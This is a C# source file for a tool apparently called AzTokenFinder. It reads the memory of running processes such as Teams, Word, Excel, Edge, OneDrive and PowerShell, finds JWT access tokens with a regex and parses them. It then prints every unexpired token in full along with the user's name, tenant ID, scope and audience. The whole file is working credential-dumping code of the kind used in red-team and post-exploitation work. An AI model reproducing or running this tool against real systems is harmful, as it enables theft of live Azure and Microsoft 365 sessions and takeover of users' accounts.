using CommandLine;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IdentityModel.Tokens.Jwt;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace AzTokenFinder
{

    // Credits to: https://codingvision.net/c-how-to-scan-a-process-memory
    internal class Program
    {
        // REQUIRED CONSTS
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int MEM_COMMIT = 0x00001000;
        const int PAGE_READWRITE = 0x04;
        const int PROCESS_WM_READ = 0x0010;

        // REQUIRED METHODS
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        // REQUIRED STRUCTS
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public ulong BaseAddress;
            public ulong AllocationBase;
            public int AllocationProtect;
            public int __alignment1;
            public ulong RegionSize;
            public int State;
            public int Protect;
            public int Type;
            public int __alignment2;
        }

        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        private static String STARTOFJWT = "eyJ0";
        private static String JWTREGEX = @"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*";
        private static String[] DefaultProcess = new string[] { "teams", "powerpnt", "winword", "onedrive", "msedge", "excel", "powershell" };

        static List<String> FindJWT(String input)
        {
            if (!input.Contains(STARTOFJWT))
            {
                return null;
            }

            List<string> result = new List<string>();
            Regex rg = new Regex(JWTREGEX);
            MatchCollection potentialJWTs = rg.Matches(input);
            for (int count = 0; count < potentialJWTs.Count; count++)
            {
                String jwtToTest = potentialJWTs[count].Value;
                JwtSecurityToken jwtToken = null;
                try
                {
                    // Check if could parse to Azure Token
                    jwtToken = new JwtSecurityToken(jwtToTest);
                }
                catch
                {
                    // Console.WriteLine("[-] Failed parsing tokens.");
                    continue;
                }

                if (!result.Contains(jwtToTest))
                {
                    result.Add(jwtToTest);
                }
            }
            return result;
        }

        static List<String> GetAzureTokenFromProcess(int processID)
        {
            List<String> AzureJWT = new List<string>();
            SYSTEM_INFO sys_info = new SYSTEM_INFO();
            GetSystemInfo(out sys_info);

            ulong proc_min_address = (ulong)sys_info.minimumApplicationAddress;
            ulong proc_max_address = (ulong)sys_info.maximumApplicationAddress;

            // opening the process with desired access level
            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, processID);
            //Console.WriteLine("OpenProcess: " + Marshal.GetLastWin32Error());

            MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

            int bytesRead = 0;

            while (proc_min_address < proc_max_address)
            {
                // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                VirtualQueryEx(processHandle, (IntPtr)proc_min_address, out mem_basic_info, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                //Console.WriteLine("VirtualQueryEx: " + Marshal.GetLastWin32Error());

                // if this memory chunk is accessible
                if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[mem_basic_info.RegionSize];

                    // read everything in the buffer above
                    ReadProcessMemory(processHandle, (IntPtr)mem_basic_info.BaseAddress, buffer, (int)mem_basic_info.RegionSize, ref bytesRead);
                    bool inString = false;
                    ulong startOfString = 0;
                    ulong endOfString = 0;
                    char[] currentStringAsChar;
                    String currentString;

                    for (ulong i = 0; i < mem_basic_info.RegionSize; i++)
                    {
                        if (buffer[i] != 0 && inString == false)
                        {
                            startOfString = i;
                            endOfString = i;
                            inString = true;
                        }
                        else if (buffer[i] != 0 && inString)
                        {
                            endOfString = i;
                        }
                        else if (buffer[i] == 0 && inString)
                        {
                            endOfString = i;
                            // Only looking for long strings
                            if (endOfString - startOfString > 20)
                            {
                                currentStringAsChar = new char[endOfString - startOfString];
                                Array.Copy(buffer, (int)startOfString, currentStringAsChar, 0, (int)(endOfString - startOfString));
                                currentString = new string(currentStringAsChar);
                                List<String> currentJWT = FindJWT(currentString);
                                if (currentJWT != null)
                                {
                                    foreach (String jWT in currentJWT)
                                    {
                                        if (!AzureJWT.Contains(jWT))
                                        {
                                            AzureJWT.Add(jWT);
                                        }
                                    }
                                }
                            }
                            inString = false;
                        }
                        else { }
                    }
                }

                // move to the next memory chunk
                proc_min_address += mem_basic_info.RegionSize;
            }
            return AzureJWT;
        }
        static void Main(string[] args)
        {

            CommandLine.Parser.Default.ParseArguments<Options>(args).WithParsed(RunOptions).WithNotParsed(HandleParseError);
        }

        static void RunOptions(Options opts)
        {
            if(opts.ProcessIDs.Count() == 0 && opts.ProcessNames.Count() == 0 && !opts.Default)
            {
                Console.WriteLine("[-] Not the correct arguments, please use --help.");
                return;
            }
            List<string> Result = new List<string>();

            if (opts.Default)
            {
                Console.WriteLine("[+] Starting with default processes.");
                foreach (String name in DefaultProcess)
                {
                    Process[] processes = Process.GetProcessesByName(name);
                    if (processes.Length == 0)
                    {
                        Console.WriteLine("[-] No process with the given name {0} found.", name);
                    }
                    else
                    {
                        foreach (Process process in processes)
                        {
                            Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
                            List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
                            if (AzureTokens == null || AzureTokens.Count == 0)
                            {
                                Console.WriteLine("[-] No tokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                            }
                            else
                            {
                                Console.WriteLine("[+] {0} tokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                foreach (string token in AzureTokens)
                                {
                                    if (!Result.Contains(token))
                                    {
                                        Result.Add(token);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if(opts.ProcessNames != null)
            {
                foreach(String name in opts.ProcessNames)
                {
                    Process[] processes = Process.GetProcessesByName(name);
                    if(processes.Length == 0)
                    {
                        Console.WriteLine("[-] No process with the given name found.");
                    }
                    else
                    {
                        foreach(Process process in processes)
                        {
                            Console.WriteLine("[+] Checking process {0} with processid {1}...", process.ProcessName, process.Id);
                            List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
                            if(AzureTokens == null || AzureTokens.Count == 0)
                            {
                                Console.WriteLine("[-] No tokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                            }
                            else
                            {
                                Console.WriteLine("[+] {0} tokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                foreach(string token in AzureTokens)
                                {
                                    if (!Result.Contains(token))
                                    {
                                        Result.Add(token);
                                    }
                                }
                            }
                        }
                    }
                } 
            }
            
            if(opts.ProcessIDs != null)
            {
                foreach(int id in opts.ProcessIDs)
                {
                    Process process = Process.GetProcessById(id);
                    if(process == null)
                    {
                        Console.WriteLine("[-] Process could not be found...");
                    }
                    else
                    {
                        Console.WriteLine("[+] Checking process {0} with processid {1}...", process.ProcessName, process.Id);
                        List<String> AzureTokens = GetAzureTokenFromProcess(process.Id);
                        if (AzureTokens == null || AzureTokens.Count == 0)
                        {
                            Console.WriteLine("[-] No tokens for process {0} with processid{1} found.", process.ProcessName, process.Id.ToString());
                        }
                        else
                        {
                            Console.WriteLine("[+] {0} tokens found in process {1} with id {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                            foreach (string token in AzureTokens)
                            {
                                if (!Result.Contains(token))
                                {
                                    Result.Add(token);
                                }
                            }
                        }
                    }

                }
            }

            if(Result.Count == 0)
            {
                Console.WriteLine("[-] No tokens found sorry.");
            }
            else
            {
                if (opts.ShowExpiredTokens)
                {
                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential tokens.", Result.Count);
                }
                else
                {
                    Console.WriteLine("[+] Finished with all given processes. Found {0} potential tokens. Showing only not expired tokens.", Result.Count);
                }
                
                Console.WriteLine();
                Console.WriteLine("==========================================================");
                foreach (string token in Result)
                {
                    JwtSecurityToken parsedToken = new JwtSecurityToken(token);
                    if (parsedToken.Payload.ContainsKey("exp"))
                    {
                        try
                        {
                            long exp = (long)parsedToken.Payload["exp"];
                            DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                            if (!opts.ShowExpiredTokens)
                            {
                                if(DateTimeOffset.UtcNow > TokenExpireTime)
                                {
                                    continue;
                                }
                            }
                            
                        }
                        catch { }
                    }
                    else
                    {
                        if (!opts.ShowExpiredTokens)
                        {
                            continue;
                        }
                    }
                    if (parsedToken.Payload.ContainsKey("upn"))
                    {
                        Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
                    }
                    if (parsedToken.Payload.ContainsKey("name"))
                    {
                        Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
                    }
                    if (parsedToken.Payload.ContainsKey("preferred_username"))
                    {
                        Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
                    }
                    if (parsedToken.Payload.ContainsKey("tid"))
                    {
                        Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
                    }
                    if (parsedToken.Audiences.Count() > 0)
                    {
                        Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
                    }
                    if (parsedToken.Payload.ContainsKey("scp"))
                    {
                        Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
                    }
                    if (parsedToken.Payload.ContainsKey("appid"))
                    {
                        Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
                    }
                    if (parsedToken.Payload.ContainsKey("exp"))
                    {
                        try
                        {
                            long exp = (long)parsedToken.Payload["exp"];
                            DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                            Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
                        }
                        catch { }
                    }
                    
                    Console.WriteLine();
                    Console.WriteLine(token);
                    Console.WriteLine("==========================================================");
                }
            }

        }
        static void HandleParseError(IEnumerable<Error> errs)
        {
            Console.WriteLine("[-] Not the correct arguments, please use --help.");
        }
    }
}
